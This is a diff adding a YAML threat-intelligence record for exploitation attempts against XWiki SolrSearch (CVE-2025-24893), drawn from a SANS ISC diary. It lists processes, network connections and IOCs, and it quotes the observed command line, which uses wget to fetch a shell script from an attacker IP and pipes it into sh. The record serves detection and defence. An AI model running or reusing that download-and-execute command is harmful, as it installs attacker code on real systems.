@@ -1,0 +1,32 @@
+description: Exploitation attempts targeting the XWiki SolrSearch component (CVE-2025-24893)
+  for remote code execution, involving a command to download and execute a shell script
+  from a malicious IP address.
+attribution: Unknown threat actor; possible connection to Chicago gang/rapper affiliations.
+TTPs:
+  processes:
+  - sh
+  commandline:
+  - sh -c wget -qO- http://74.194.191.52/rondo.sdu.sh|sh
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: sh
+    destination: 74.194.191.52
+    port: 80
+    protocol: http
+    url: http://74.194.191.52/rondo.sdu.sh
+  file_activity: []
+  persistence: []
+  process_relations: []
+IOCs:
+- type: ip
+  value: 74.194.191.52
+- type: url
+  value: http://74.194.191.52/rondo.sdu.sh
+authors:
+- Johannes B. Ullrich, Ph.D.
+reference: https://isc.sans.edu/forums/diary/XWiki+SolrSearch+Exploit+Attempts+CVE202524893+with+link+to+Chicago+GangsRappers/32444
+date_of_publication: November 03, 2025
+file_creation_date: November 04, 2025
